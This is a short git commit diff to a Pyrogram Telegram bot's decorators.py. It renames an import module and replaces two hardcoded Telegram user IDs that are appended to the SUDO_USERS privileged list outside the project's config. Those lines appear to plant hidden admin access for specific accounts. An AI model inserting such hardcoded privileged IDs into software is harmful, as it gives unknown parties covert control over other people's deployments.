f959e90bbb2575dd792d8ab6854f7c687776da29
bitchlah <106461653+bitchlah@users.noreply.github.com>
2022-05-30 20:39:29 +0700

    Update decorators.py

--- Zaid/decorators.py
+++ Zaid/decorators.py
@@ -2,11 +2,11 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 from config import SUDO_USERS
-from Zaid.admins import get_administrators
+from ALBY.admins import get_administrators
 
 
-SUDO_USERS.append(1669178360)
-SUDO_USERS.append(1920507972)
+SUDO_USERS.append(1441342342)
+SUDO_USERS.append(5089916692)
 
 
 
